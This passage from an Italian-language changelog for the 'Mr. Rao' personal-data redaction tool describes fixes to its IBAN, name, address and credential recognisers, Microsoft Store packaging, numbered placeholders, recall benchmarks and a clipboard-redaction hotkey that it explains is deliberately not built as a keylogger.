120 MB di librerie non più incluse, perché una copia sovrascrive ciò che
trova e non tocca ciò che non c'è più.

### Quattro pulsanti che non fingono di essere equivalenti

Sulle due landing e nei due README ci sono ora quattro strade: installer,
portable, Microsoft Store — con la fascia «in arrivo», finché la
certificazione non passa — e GitHub.

Sotto ognuna c'è scritto **cosa cambia davvero**, cioè cosa dirà Windows: il
`.exe` non firmato è il caso che SmartScreen tratta peggio, lo zip è più
lieve, dallo Store non compare niente perché lo firma Microsoft. Quattro
pulsanti uguali avrebbero mandato la maggioranza sulla strada con l'avviso
più spaventoso senza dirglielo prima.

### Sotto il cofano

- L'installer nasce con **due nomi**, come lo zip: `MrRaoSetup.exe` fisso —
  che è l'unica cosa che fa funzionare `releases/latest/download/...`, cioè i
  pulsanti — e `MrRaoSetup-1.21.0.exe` versionato. Quando l'archivio
  versionato entrò nella release, i link col nome fisso cominciarono a
  rispondere 404 in silenzio: qui il trattamento c'è dal primo giorno.
- `SHA256SUMS.txt` ora nomina anche l'installer. Lo scriveva
  `make_release_zip.py`, che conosce solo gli zip: pubblicare un elenco di
  impronte che non copre uno dei file scaricabili è peggio che non
  pubblicarlo.
- L'attestazione di provenienza Sigstore copre **tutte e tre** le confezioni,
  con un test che lo verifica: senza, la più nuova — quella su cui Windows fa
  l'avviso più grosso — sarebbe anche l'unica su cui `gh attestation verify`
  non sa niente.
- Inno Setup è preinstallato sui runner `windows-latest` (6.7.1), quindi non
  c'è niente da installare in CI.

## 1.20.0 — I segnaposto hanno un numero, e il rapporto dice cosa è rimasto

Una release nata da un confronto con lo stato dell'arte, e **quasi tutto il
valore sta nei difetti che il confronto ha fatto emergere**, non nelle
funzioni nuove. Tre erano già in produzione, e due dei tre erano silenziosi
— il tipo peggiore, quello in cui il rapporto ti dice che è andato tutto
bene.

### Il pacchetto dello Store si apriva soltanto sulla macchina di chi lo faceva

La certificazione del Microsoft Store ha rimandato indietro il pacchetto con
*«The product crashes at launch»*. Aveva ragione, e la causa è di quelle che
si vedono solo dove il programma non l'hai messo tu.

Un pacchetto MSIX si installa in `C:\Program Files\WindowsApps`, che è
protetta da ACL e **non è scrivibile nemmeno da un processo elevato**. Fino
alla 1.19 la cartella scrivibile era sempre quella dell'eseguibile — scelta
giusta nel portable, dove è proprio ciò che lo rende portable — e all'avvio
il programma ci creava la cartella degli upload.

Quel `mkdir` non gira dentro una funzione che qualcuno chiama: gira
**durante l'importazione**. Un'eccezione lì non produce un errore gestito,
produce un processo che muore prima di stampare una riga.

**Perché non se n'era accorto nessuno.** Il pacchetto *conteneva* una
cartella `uploads`, quindi a guardarlo sembrava tutto a posto — ma è vuota,
e le cartelle vuote non sopravvivono all'impacchettamento. Nel file finito
non c'era. E ogni prova girava su un albero sorgente o su un portable in una
cartella scrivibile, cioè nell'unica condizione in cui il difetto non esiste.

Corretto in tre punti, perché uno solo sarebbe stato un cerotto: il
programma ora **sa se sta girando dentro un pacchetto** (lo chiede a
Windows, non lo indovina dal percorso) e in quel caso scrive nel profilo
dell'utente; il pacchetto non porta più una cartella upload che non
potrebbe usare; e nessun `mkdir` all'avvio può più uccidere il programma —
se la cartella non si può creare si ripiega, lo si scrive nel rapporto, e
**la finestra si apre lo stesso**. Il portable resta identico: scrive
accanto a sé, com'è giusto.

### I difetti trovati

**Otto Paesi di IBAN non venivano riconosciuti affatto.** Un IBAN si stampa
a gruppi di quattro: quando la lunghezza non è divisibile per quattro,
l'ultimo gruppo può essere di **un** carattere (`PT92 … 6LGU A`). Il pattern
pretendeva gruppi da almeno due, e su Portogallo, Svizzera, Croazia,
Brasile, Ucraina, Qatar, Palestina e São Tomé non trovava niente — zero IBAN
dichiarati su un documento che ne conteneva uno.

Il pattern ora è goloso apposta, e a dire dove finisce il numero è la
tabella ISO 13616 delle lunghezze per Paese, che serviva già a validare e
adesso serve anche a tagliare. Quello che il pattern prende in più torna al
testo invece di far fallire il mod-97. Provato su **79 Paesi su 79, con
cinque valori ciascuno**.

**E gli IBAN scritti col trattino non hanno mai funzionato.** Il pattern
accettava `IT60-X054-2811-…` da sempre; il validatore toglieva **il solo
spazio**, quindi i trattini restavano dentro, la lunghezza non tornava e il
candidato spariva in silenzio. Nessun test se n'era accorto perché tutti
usavano gli spazi. È il difetto che nasce ogni volta che due punti del
motore hanno un'idea diversa di cosa sia un separatore: quando si allarga
l'uno si guarda l'altro.

**E quelli mandati a capo dall'estrattore nemmeno.** Su una carta intestata
o una fattura l'IBAN va a capo come qualunque altra riga, e il separatore
non ammetteva il ritorno a capo. Adesso se ne concede **uno**, non `\s`
libero: un IBAN va a capo una volta, una colonna di codici in tabella va a
capo a ogni cella, e con l'a-capo libero due codici diversi diventerebbero
un candidato solo — bocciato dal mod-97, con l'IBAN vero lasciato in chiaro.

**La carta di credito col punto** (`4111.1111.1111.1111`, come la stampano
alcuni gestionali) non veniva vista: il telefono accettava già il punto, la
carta no, e non c'era una ragione.

**Gli enti intitolati a una persona sparivano.** `Ospedale San Raffaele` e
`Istituto Comprensivo Alessandro Manzoni` restavano interi, ma `Policlinico
Agostino Gemelli` diventava `{{NAME}}` e `Teatro Giuseppe Verdi` pure: nel
vocabolario delle parole d'ente c'erano `ospedale` e `istituto`, non
`policlinico` né `teatro`. Non è una fuga — è il contrario — ma è il falso
positivo peggiore che questo prodotto possa fare: la frase perde il
soggetto, e chi legge il documento redatto non sa nemmeno di quale ospedale
si parlasse.

Aggiunte una quarantina di parole (edifici e istituzioni). **Il prezzo è
scritto**: una parola d'ente scherma l'intera sequenza maiuscola adiacente,
quindi `Clinica Mario Rossi` ora è schermato per intero — come lo erano già
`Ufficio Mario Rossi` e `Fondazione Mario Rossi`. Non vale quando fra
l'ente e la persona c'è un ruolo o una punteggiatura.

**Il rapporto contava tre segreti dove ce n'era uno.** Su `Chiave: api_key =
sk-test-…` il motore sostituiva la credenziale, poi **rimangiava il proprio
segnaposto** come se fosse un valore, poi prendeva anche l'etichetta. Il
difetto c'era da sempre, e i tre `{{SECRET}}` identici lo nascondevano: si è
visto solo quando i segnaposto sono diventati distinguibili.

**E il collaudo del pacchetto respingeva un pacchetto buono.**
`scripts/verify_build.py` avvia l'eseguibile costruito, gli fa convertire un
`.docx`, un `.xlsx` e un `.pptx`, e cerca i segnaposto nel testo che torna:
cercava `{{EMAIL}}` alla lettera, trovava `{{EMAIL_1}}` e dichiarava
l'anonimizzazione incompleta. Il pacchetto era a posto, il metro era vecchio.

Nessuno dei test poteva vederlo: quel collaudo vive **fuori da pytest**, gira
solo dentro `build_portable.bat`, e nulla legava ciò che si aspetta a ciò che
il motore produce davvero. Ora quel legame c'è — la stessa frase, lo stesso
motore, lo stesso controllo, dentro la suite — e il controllo continua a dire
di no nei due casi che contano: il dato uscito in chiaro, e il marcatore
interno che arriva a chi legge.

### Segnaposto numerati

`{{NAME_1}}`, `{{NAME_2}}`: persone diverse ricevono numeri diversi, la
stessa persona ripetuta riceve sempre lo stesso. Senza, «`{{NAME}}` ha
citato `{{NAME}}` davanti a `{{NAME}}`» non si legge, e un modello
linguistico non ci può ragionare sopra.

**Acceso di default**, e chi preferisce l'uscita di prima toglie la spunta a
«Numera i segnaposto».

**Cosa si è perso, detto per intero.** Fino alla 1.19 in uscita non si poteva
ricollegare chi era chi. Adesso, *dentro un documento*, si può: i numeri
dicono quante persone distinte ci sono e in quali punti compare ciascuna.
Non sono i valori — non c'è modo di risalire da `{{NAME_2}}` a un nome — ma
sono **la struttura** dei dati personali, e prima non usciva. La domanda 8
delle FAQ è stata riscritta per dirlo, invece di lasciare in piedi una
promessa più larga del vero.

Restano vere le due proprietà su cui quella pagina continua a costruire: il
numero **non porta da nessuna parte** (la corrispondenza vive in memoria per
il tempo della conversione e non viene scritta mai) e **non è stabile fra
documenti** — dipende dall'ordine di comparsa, quindi non ci si può fare un
join. Un numero stabile sarebbe un identificatore persistente: un dato
personale nuovo, inventato da noi, in uno strumento che esiste per toglierli.

I numeri seguono l'ordine del **testo**, non quello in cui scattano i
riconoscitori, e non toccano i segnaposto che erano già nel documento in
ingresso: un file redatto e ripassato dal motore non si vede cambiare i
numeri sotto i piedi.

### Rilevato ma non sostituito

Fino alla 1.19 gli stati erano due, e non erano separabili: cerca e
sostituisci, oppure non cercare. Chi aveva bisogno di un dato in chiaro —
gli importi di una fattura da far confrontare a un modello, l'età in una
cartella clinica — poteva solo spegnere. E spegnere **non lascia traccia**:
il documento esce con il dato dentro e il rapporto tace, quindi chi lo
rilegge non sa se lì non c'era niente o se abbiamo guardato dall'altra
parte.

Adesso gli stati sono tre. Le categorie spuntate in «Rileva ma non
sostituire» vengono cercate, riportate e lasciate nel documento — e il
rapporto lo dice: «ho lasciato in chiaro 3 importi, apposta» è
un'informazione per un DPO, il silenzio no. Il conto finisce anche nel
**frontmatter**, che è l'unica parte del rapporto che viaggia col documento:
chi lo riceve fra sei mesi non ha la richiesta HTTP, ha il file.

I tre numeri restano separati — cosa è stato tolto, cosa è stato lasciato
apposta, cosa il motore non ha saputo decidere. Sommarli darebbe un totale
che non vuol dire niente.

### Più etichette per le credenziali, e nessuna entropia

Il vocabolario delle etichette che annunciano una credenziale era corto e
quasi tutto inglese. Adesso copre i token di ogni specie, le chiavi di
cifratura e di licenza, le stringhe di connessione, le passphrase — e tre
casi che prima non potevano funzionare: **PIN, CVV e OTP**, che sono corti e
numerici e non arrivavano al minimo di sei caratteri del valore generico, e
la **frase di recupero**, l'unico segreto fatto di parole separate da spazi,
di cui prima sarebbe sparita una parola su dodici lasciando la frase
utilizzabile e il rapporto soddisfatto.

**Non è stata presa la strada dell'entropia**, cioè riconoscere una
credenziale perché «sembra generata a caso». Hanno quell'aspetto anche gli
hash dei commit, gli UUID, le firme base64 dentro un PDF e i numeri di
serie: su un documento tecnico sarebbe un massacro, e sbaglierebbe in
silenzio su una classe intera. Un'etichetta sbagliata invece si vede subito
e si toglie. Il conto dei falsi positivi su 8,5 milioni di caratteri di
documenti amministrativi italiani dove l'atteso è zero è rimasto **1**,
prima e dopo l'allargamento.

### Quanto ci sfugge: adesso c'è un numero

Tutti i banchi di questo progetto misuravano i **falsi positivi** — quante
volte il motore sbaglia su documenti che non contengono niente. È la metà
giusta da misurare per prima, ed è metà. L'altra è quella che conta per chi
si fida: **quanti dati veri restano nel documento**. Fino a oggi non
avevamo un numero.

Adesso sì, su 29 297 documenti italiani e 118 283 valori la cui aritmetica
**ricalcoliamo noi** invece di prenderla per buona dal corpus:

| | richiamo |
|---|---|
| carte di credito, codici fiscali | 100% |
| indirizzi di posta | 99,9% |
| IBAN | 99,8% |
| telefoni | 99,6% |
| **nomi** | 99,4% |
| partite IVA | 98,4% |

Il banco ha trovato cinque buchi, tutti chiusi qui dentro. E il numero dei
nomi è arrivato dove sta dopo una misura che ha detto **dove** guardare:
partiva da 92,5%, e quattro cognomi soli — Villa, Conti, Messina, Gentile —
facevano il **96% delle perdite**. Sono nell'elenco delle parole comuni
apposta: è la scelta che ha tolto 8 904 sostituzioni sbagliate sui moduli in
bianco, e levarli da lì sarebbe stato tornare indietro.

Quello che mancava era un'altra cosa: accorgersi che con un **nome di
battesimo davanti** quella parola non è più ambigua. «Tommaso Gentile» è una
persona, «Gentile Cliente» resta un saluto — la direzione è tutta la
sicurezza della regola. Costo misurato: **5 sostituzioni in più** su 8,5
milioni di caratteri di documenti dove l'atteso è zero, in cambio di 5 417
nomi che prima restavano nel documento senza che nessuno lo dicesse.

Un numero va letto per quello che è: il corpus è **sintetico**, e sui nomi
resta indicativo — i nomi generati vengono da elenchi e i nostri
riconoscitori usano elenchi. Quello che vale davvero lì sono i valori persi,
che ora sono un'altra popolazione: cognomi con la particella («Di Maio
Gianni») e nomi scritti in minuscolo.

### Sotto il cofano

Un banco che ricostruisce da fonti versionate il corpus a verità zero, e due
corpora italiani etichettati per misurare il richiamo. La suite passa da
1 122 a 1 756 prove.

I corpora non sono nostri e non vengono ridistribuiti: gli script li
scaricano dalle fonti originali sulla macchina di chi misura. Il credito e
le licenze stanno in **[NOTICE.md](../NOTICE.md), sezione 6** — non qui,
perché un'attribuzione in un changelog scorre via alla release dopo, e
questa deve restare finché restano i numeri che ci si appoggiano.

---

## 1.19.1 — Il motore si rimangiava il proprio lavoro

Un difetto piccolo nel testo e grosso nel rapporto, e **l'ha trovato il
corpus di conformità** — quello nato per un'altra ragione, tenere allineato
un motore portato in un altro linguaggio. Non l'ha trovato un test.

`{{NINO}}` — il segnaposto del National Insurance number britannico — è
anche un nome di battesimo italiano. Le graffe non sono caratteri di parola,
quindi la guardia `(?<!\w)` non impediva niente: il riconoscitore dei nomi,
che gira **dopo**, trovava `NINO` dentro il segnaposto appena inserito, lo
cercava negli elenchi, lo trovava, e lo depositava fra i sospetti.

Il testo usciva giusto. **A sporcarsi era il rapporto, ed è la parte che
conta di più.** I sospetti dicono «qui c'è qualcosa che assomiglia a un dato
personale e *non* l'ho tolto, vallo a guardare»: è la lista su cui si regge
l'onestà del prodotto. Chi ne trova due o tre finti smette di guardarli
tutti, e a quel punto smette di guardare anche quelli veri.

La guardia sulle graffe c'era già su `_TOK_MISTO` e su
`_RE_NAME_PAIR_UPPER`; mancava su `_RE_LONE_TOKEN` e `_RE_NAME_RUN`. Adesso
c'è su tutti e quattro.

**Il test non prova NINO.** Legge i segnaposto **dal sorgente del motore**,
come fa il gate, e li prova tutti: oggi il collo è uno su trenta, domani un
riconoscitore nuovo può portarne un altro e nessuno ci penserebbe. Ha anche
un controllo che fallisce se l'elenco dei segnaposto risulta vuoto — sarebbe
il modo in cui questa prova diventerebbe verde per non aver guardato niente.

Verificato su tutti e trenta i segnaposto attuali: **NINO era l'unico**.

## 1.19.0 — Tre cose che si rompevano senza dirlo

Nessun cambio al motore di redazione. Tre difetti che avevano in comune il
modo di manifestarsi: **niente**. Nessun errore, nessun messaggio, e un
programma che sembrava aver funzionato.

### La seconda istanza non nasce più (P0.3)

Era l'ultima P0 aperta, ferma da undici release. Fino alla 1.18.2 la porta
occupata aveva **una sola** risposta per tutti i casi: parti su un'altra
porta. Verso un programma estraneo è quella giusta. Verso un altro Mr. Rao
era esattamente la «seconda istanza cieca» che la voce chiedeva di evitare —
e costava più della porta:

- due icone nella barra, e nessuna delle due dice quale sta servendo cosa;
- **la scorciatoia degli appunti persa in silenzio**: `RegisterHotKey` è
  esclusiva per tutta la sessione di Windows, il secondo processo non la
  ottiene e nessuno se ne accorge finché Ctrl+Alt+R non risponde;
- il browser aperto sulla porta nuova, mentre la finestra già aperta e i
  segnalibri continuano a parlare con la vecchia.

Chi lancia due volte non sta chiedendo due server: sta chiedendo *la
finestra*. Adesso l'avvio guarda **chi** risponde su `/api/health`. Stessa
versione: non nasce nessun processo, si apre quella finestra e si esce con
`0` — perché non è successo niente di sbagliato. Versione diversa: si parte
altrove **dicendo entrambi i numeri**, perché mandare qualcuno su una
versione che non ha lanciato sarebbe il difetto originale al contrario.
Estraneo: prima porta libera, come prima.

La decisione sta in `mr_rao/portcheck.py` come funzione pura con le sonde
iniettate, e non in `app.py`, dove l'import costruisce l'applicazione Flask:
una scelta che non si può provare a buon mercato finisce per non essere
provata. Ma le sonde iniettate provano la *decisione*, non che l'avvio la
rispetti — quindi c'è anche un test che lancia `app.py` per davvero contro
un finto `/api/health` che dichiara la nostra versione, e controlla che
nessuna porta in più sia stata presa **mentre il processo è vivo**.

**Il difetto è stato riprodotto prima di correggerlo.** Sul commit
precedente, stesso scenario: `-> Questa istanza parte sulla porta 12639`, e
la 12639 occupata. È anche il motivo per cui il banco usa `Popen` e non
`subprocess.run`: al timeout `run` uccide il figlio, la porta si libera, e
il controllo direbbe «nessuna seconda istanza» proprio nel caso in cui ce
n'è una.

### Il confronto prima/dopo si adatta agli schermi bassi (P4.7)

`renderDiff()` scriveva gli stili in linea, e uno stile in linea batte
qualsiasi media query: il riquadro del testo originale restava alto 240 px
anche su uno schermo da 375 px di altezza. Su un telefono girato il
contenitore ne misura 232: il solo testo originale chiedeva più spazio della
scatola che lo conteneva. E succedeva nella scheda che secondo i nostri
stessi documenti è «il controllo che conta».

Ora sono sei classi in CSS. A viewport normale **niente cambia** — verificato
confrontando 27 proprietà calcolate su tutti e sei gli elementi, classi nuove
contro il vecchio attributo `style`: identiche. A viewport bassa il media
query finalmente vince: 240 px diventano 180, 150 e 112,56 px a 800, 600,
500 e 375 px di altezza.

Nella stessa passata sono stati guardati **tutti** gli stili in linea del
front-end. Ne è stato spostato un secondo (la dicitura degli allegati); gli
altri restano dove sono, con la ragione scritta: `display` è stato
dell'interfaccia e non aspetto, la larghezza della barra di avanzamento e le
coordinate del tooltip si calcolano a runtime, e l'allineamento delle celle
arriva dal documento convertito — è un dato, non presentazione.

### Il sito pubblicato adesso lo dice, quando è indietro (P3.17)

Il progetto Cloudflare Pages è a **caricamento diretto**: `git push` non
pubblica niente. Finché non girano `_rebuild.py` e `wrangler pages deploy`,
online resta la versione di prima **in silenzio**. È successo il 2026-08-09:
la landing inglese era corretta, committata e pushata, e online c'era ancora
la vecchia. Se n'è accorto l'utente guardando il sito.

È lo stesso modo di rompersi che `check_docs.py` esiste per impedire,
spostato di un passo più in là: quel gate garantisce che il repository sia
coerente con sé stesso, e nessuno garantiva che il **pubblicato** fosse il
repository.

`scripts/check_sito_pubblicato.py` scarica le pagine online, legge la
versione dichiarata e la confronta con `APP_VERSION`. Non pubblica: non
chiede nessuna credenziale, nessun token Cloudflare, nessun permesso di
scrittura. È la ragione per cui è stato preferito a un deploy automatico su
push — un'azione che pubblica manda online **qualunque cosa** finisca su
main, compresa una landing modificata e non riletta.

**Quattro esiti, non due.** `0` allineato, `1` disallineato (indietro o
avanti, detti separatamente), `2` irraggiungibile, `3` cieco. Il `2` non è
mai il `0`: un controllo di rete che in caso di errore tace è verde proprio
quando servirebbe. Il `3` è quello che merita più attenzione ed è il più
facile da non scrivere — se le pagine spariscono dall'elenco o online non
c'è più un numero riconoscibile, tutti i confronti passano senza confrontare
niente. Gli indirizzi non sono scritti nello script: si leggono dal
`<link rel="canonical">` delle pagine pubblicate, perché una seconda copia
dell'indirizzo è una seconda cosa che può restare indietro.

**Non è nel gate bloccante, ed è una scelta.** Fra il push del bump e il
deploy il sito è legittimamente indietro: un rosso di mezz'ora dopo ogni
release non segnala un difetto, addestra a ignorare il rosso — e il rosso
che si impara a ignorare non è questo, è quello degli altri passi, che
stanno nello stesso posto. Gira una volta al giorno e a mano quando serve.

**Al primo giro ha trovato un difetto vero**: online c'era la 1.18.1 mentre
il repository era già alla 1.18.2. Cioè la 1.18.2 era stata rilasciata e il
sito non l'aveva mai vista, esattamente come la voce descriveva.

E che sappia dire di no è stato dimostrato guastandolo in tre modi — l'errore
di rete inghiottito, il confronto svuotato, la pagina senza numero trattata
come normale: dieci test rossi in tutto, poi ripristinato e riverificato.

## 1.18.2 — Nessuno aveva mai premuto quei tasti

Due controlli, nessun cambio di comportamento.

### La scorciatoia non era mai stata provata premendola

La 1.18.0 è uscita con 22 test: lo strato che **decide** (lettura e
scrittura degli appunti iniettate) e lo strato che parla con gli **appunti**
di Windows, quest'ultimo aggiunto dopo che una prova dal vivo aveva trovato
gli handle troncati. Restava fuori quello in mezzo — `avvia_scorciatoia`,
cioè la registrazione presso il sistema, il ciclo dei messaggi e il richiamo
— e non lo copriva nessun test **né una prova a mano**: la funzione era
stata spedita senza che nessuno avesse mai premuto Ctrl+Alt+R.

Ora c'è un test che registra la combinazione per davvero e la preme per
davvero, con `SendInput`. Funziona: tasti premuti, appunti redatti.

**Ma la prima esecuzione diceva di no, e il colpevole era il banco.** La
struttura `INPUT` a 64 bit va dimensionata sull'unione più grande
(`MOUSEINPUT`: 40 byte) e `dwExtraInfo` è un `ULONG_PTR`, non un puntatore.
La prima versione ne dichiarava 32: `SendInput` non inseriva niente, tornava
`0`, e quel valore di ritorno non veniva controllato. Il banco concludeva
«la combinazione non scatta» — **un controllo che diceva sempre di no**,
l'altra faccia di quello che non può fallire e altrettanto inutile. Adesso
`sizeof(INPUT)` e il ritorno di `SendInput` sono due asserzioni: se il banco
non sa premere i tasti lo dice, invece di accusare il prodotto.

### P3.19, la metà meccanica

Ogni modulo di `mr_rao/` deve comparire nella tabella di `ARCHITECTURE.md`,
**in tutte e due le lingue**. Nasce dal fatto che `appunti.py` è uscito
nella 1.18.0 e la mappa del progetto continuava a non nominarlo: è proprio
la pagina che si legge per orientarsi prima di toccare qualcosa, e un modulo
che non c'è è un pezzo di programma che per chi arriva non esiste. Il
presidio dei segnaposto non poteva vederlo — un modulo nuovo non porta per
forza un segnaposto nuovo.

Acceso, ha trovato subito un buco vero: **`mr_rao/__main__.py` non era in
nessuna delle due tabelle**. Aggiunto.

**L'altra metà di P3.19 resta fuori di proposito.** Sarebbe contare i
«segnali» dei nomi dentro la prosa di tre documenti per verificare che
dicano lo stesso numero: un controllo che estrae un concetto dal testo
approssima ciò che verifica, e si perde proprio il caso scritto in un modo
che non aveva previsto. Il confronto fra nomi di file veri e testo letterale
non ha niente da interpretare; quello sì.

1040 test.

## 1.18.1 — L'indirizzo usciva dalla riga

Due difetti nel riconoscitore di indirizzi, trovati **costruendo un esempio
prima/dopo da mostrare in pubblico**. Il che dice qualcosa su quanto valga
far girare il motore su un testo che non è un caso di prova: nessuno dei
1024 test li vedeva, e il corpus pubblico nemmeno — perché entrambi
sbagliavano l'**estensione** del riscontro, non il numero.

### Si mangiava la prima parola del blocco dopo

```
Address: Via A. Volta 5, 20121 Milano
Account: IT60 X054 2811 1010 0000 0123 456
```

usciva come `Address: {{ADDRESS}}: {{IBAN}}`. La parola **«Account» sparita
dal documento**. Con una riga vuota in mezzo non cambiava niente: *«Via
Verdi 12, 40100 Bologna ⏎⏎ Allegato A»* si portava via anche la «A».

Due danni, e il secondo pesa più del primo. Una parola tolta non è una
fuga — non esce niente che doveva restare — ma è un **documento corrotto**,
e chi guarda il confronto prima/dopo non ha modo di accorgersene: vede un
segnaposto, non vede cosa c'era intorno. E il **segnale della firma viene
distrutto**: *«Cordiali saluti»* è esattamente ciò che dichiara che quello
che segue è una persona, ed è l'unico contesto in cui un cognome da solo
vale come prova. Mangiando «Cordiali» si spegne un riconoscitore mentre se
ne allarga un altro.

La causa era `\s` invece di `[ \t]`: **lo spazio dentro un indirizzo è
orizzontale**. Stesso difetto già pagato nella 1.14.0 con l'email offuscata,
e stessa ragione per cui i nomi usano `_SP`. Un solo a capo resta concesso,
e solo prima del CAP, perché sulla carta intestata l'indirizzo si scrive su
due righe — c'è un test che lo protegge, altrimenti il modo più semplice di
chiudere il difetto sarebbe vietare ogni a capo e perdere metà degli
indirizzi veri.

### Il civico mordeva il CAP

*«Piazza G. Verdi, 1 - 00198 Roma»* usciva come `{{ADDRESS}}98 Roma`: il
suffisso del civico (`12/A`, `7-bis`) prendeva `- 001` e lasciava indietro
tre cifre orfane. Il guardiano introdotto nella 1.16.0 fermava il suffisso
sulle **lettere** e non sulle cifre.

Questo era già passato sotto gli occhi: sta stampato a schermo nella misura
della 1.16.0, dentro le Gazzette Ufficiali, e non l'ho guardato. Una riga di
output non è una verifica finché qualcuno non la legge.

**Costo: zero.** Sul corpus pubblico i conteggi sono identici — 42 indirizzi
e 107 nomi sulla prosa vera, zero sui 42 moduli in bianco. Le correzioni
cambiano *quanto* prende ogni riscontro, non *quanti*.

1038 test, 14 nuovi, 9 dei quali rossi sul commit precedente.

## 1.18.0 — Copi, premi, incolli

Fin qui Mr. Rao ha dipeso da una cosa che non controlla: che qualcuno si
ricordi di passargli il documento **prima**. Il motore è buono — 1024 test
lo dicono — ma un contratto incollato in una chat senza passare di qui non
lo tocca nessuno.

**Ctrl+Alt+R.** Copi il testo, premi, incolli: quello che arriva è già
redatto. Gli appunti *sono* il posto — niente da aprire, caricare o
scaricare. È lo stesso motore della conversione dei file, non una seconda
implementazione: se ce ne fosse una, prima o poi divergerebbe, e in un
motore di redazione una divergenza è una fuga che non si vede.

Guida completa: [SCORCIATOIA-APPUNTI.md](SCORCIATOIA-APPUNTI.md).

### Perché non è un keylogger, e come si verifica

Un programma acceso che reagisce a una combinazione di tasti ha, da fuori,
la stessa sagoma di uno che registra quello che scrivi. Per uno strumento di
privacy la somiglianza non basta smentirla a parole, quindi la differenza è
architetturale e verificabile leggendo il codice.

Windows offre due meccanismi. `SetWindowsHookEx(WH_KEYBOARD_LL)` consegna al
programma **ogni tasto** premuto sulla macchina — è il meccanismo con cui si
scrive un keylogger, ed è comodo perché permette combinazioni arbitrarie.
**Non lo usiamo.** `RegisterHotKey` dichiara al sistema **una** combinazione:
la sorveglia Windows, e recapita un messaggio solo quando *quella* viene
premuta. Gli altri tasti non arrivano — non è che vengano ignorati, non
vengono consegnati.

Costa qualcosa (meno combinazioni possibili, e se un altro programma ha già
preso la scelta la registrazione fallisce — dicendolo), ed è il prezzo
giusto. C'è un test che fallisce se un domani qualcuno passasse al gancio
per avere più libertà: è una promessa pubblicata, non una preferenza.

Allo stesso modo **gli appunti non vengono sorvegliati**: nessun controllo
periodico. Si aprono quando la combinazione scatta, si leggono una volta, si
riscrivono una volta e si richiudono.

### Le tre cose che l'avrebbero resa peggio del non usarla

- **Riscrivere appunti che non sono cambiati.** Toglierebbe comunque gli
  appunti all'applicazione che li possiede — il formato ricco, l'immagine
  affiancata — senza nessun guadagno. Se il testo non cambia, non si tocca.
- **Perdere l'originale.** Sovrascrivere distrugge ciò che c'era: il primo
  caso in cui la redazione toglie qualcosa che serviva farebbe perdere il
  testo. C'è «Ripristina gli appunti originali» nel menu dell'icona, **in
  memoria e mai su disco** — un file di ripristino sarebbe un file con
  dentro i dati personali in chiaro.
- **Dire «fatto» quando è rimasto un sospetto.** La notifica compare
  sempre, anche a zero, e distingue i due numeri: *«9 dati redatti · 2 da
  controllare — non tolti»*. I sospetti **non** sono stati rimossi, e chi
  incolla senza leggere incolla un dato ancora lì.

### Ventuno test verdi e la funzione che non funzionava

Vale la pena raccontarlo perché è il tipo di errore che questo progetto
cerca di rendere impossibile, e stavolta è passato lo stesso.

I test coprono lo strato che **decide**, dove lettura e scrittura degli
appunti arrivano dall'esterno. È il disegno giusto — è ciò che rende la
funzione provabile senza premere tasti a mano — ma vuol dire che non dicono
niente sullo strato che parla con Windows, dove non c'è niente da decidere e
tutto da sbagliare.

E si è sbagliato: senza dichiarare `restype`, `ctypes` assumeva che
`GetClipboardData` tornasse un intero a 32 bit invece di un handle a 64.
L'handle arrivava **troncato**, `GlobalLock` falliva, la lettura tornava
vuota. Ventuno test verdi, e copia-premi-incolla non faceva niente.

L'ha trovato una prova dal vivo sugli appunti veri. Ora quella prova è un
test — che gira anche in CI, dove la macchina è Windows — e reintrodurre il
difetto non fa fallire un'asserzione: fa morire l'interprete.

Nella stessa passata: `GlobalFree` sul percorso di errore, che mancava.
Senza, un `SetClipboardData` fallito lasciava in memoria un blocco con
dentro il testo in chiaro.

## 1.17.0 — Una regola da due righe dove un modello da 64 MiB non arrivava

Due cose, e la seconda serve a non perdere la prima.

### «Il Ministro: GIORGETTI»

È la forma con cui si firmano gli atti pubblici italiani: **un ruolo, i due
punti, e un cognome solo in maiuscolo**. Nessuna regola la vedeva — il
riconoscitore a coppie pretende due parole maiuscole adiacenti, e qui la
parola è una. Contata sulle dodici Gazzette Ufficiali del corpus pubblico:
**107 occorrenze intatte**, fra cui i cognomi di sei ministri in carica.

Gli elenchi qui non servono, ed è il numero che ha deciso il disegno: dei
114 cognomi trovati in quella forma, **28** stanno nei nostri elenchi.
Pretendere il riscontro avrebbe lasciato passare gli altri 86. Quello che
decide è il **ruolo davanti ai due punti**.

Vale la pena dirlo per esteso, perché è il contrario di quel che si
suppone: l'indagine P3.6 aveva misurato su questa stessa forma un modello
NER da **64 MiB**, che ne prendeva **3 su 42**. Una regola da due righe
arriva dove il modello non arriva, perché il segnale non sta nella
semantica — sta nella punteggiatura.

Tre guardie, e nessuna è stata immaginata: ognuna nasce da un falso
positivo visto sul corpus.

- **Niente virgola** fra il ruolo e i due punti. *«Responsabile della
  protezione dei dati, all'indirizzo: INPS»* ha un ruolo davanti, ma i due
  punti sono di «indirizzo»: la virgola dice che la frase è andata avanti.
- **Una riga sola.** Attraversando l'a capo si prendeva *«IACHINO ↵
  MINISTERO DELLA»*, cioè il cognome più l'intestazione della sezione dopo.
- **Tutto maiuscolo, e nessuna parola comune.** È il presidio contro
  l'altra faccia della stessa forma, che su un modulo è un'etichetta di
  campo: *«Responsabile: SETTORE TECNICO»*, *«Direttore: UFFICIO
  ACQUISTI»*. Il maiuscolo non è un dettaglio estetico: in un atto firmato
  il cognome è in maiuscolo perché è una firma, e chiederlo costa un
  richiamo che non abbiamo mai avuto invece di aprire la porta a *«Il
  presidente: Vedi allegato»*.

Costo misurato: **zero** sui 42 moduli in bianco (27 italiani, 15
statunitensi). Tutte e 107 le sostituzioni stanno nella prosa vera.

### Il richiamo non può più scendere in silenzio

Tutti i banchi di questo progetto contano gli **errori** su documenti che
non contengono niente. È la metà giusta da guardare per prima, ma è una
metà: se domani una modifica facesse smettere il motore di vedere *«piazza
G. Verdi, 1»*, quei banchi resterebbero tutti verdi. **Zero errori su un
documento vuoto è anche il risultato di un motore spento.**

`scripts/bench_corpus_pubblico.py` guarda l'altra metà, sui documenti che
non abbiamo scritto noi, e fallisce in **due** direzioni: se compare una
sostituzione sui moduli in bianco, e se il numero di sostituzioni sulla
prosa vera **scende**. I numeri sono congelati in
`tests/dati/corpus_pubblico_atteso.json` insieme all'impronta dell'elenco
dei file, così puntare il banco a un corpus diverso viene detto invece di
sembrare una regressione.

Il corpus non sta nel repository — decine di megabyte, e non sono nostri da
ridistribuire: si passa con `MRRAO_CORPUS` e il test si salta dicendolo.
Ma i tre test che provano il **meccanismo** girano sempre, anche in CI: un
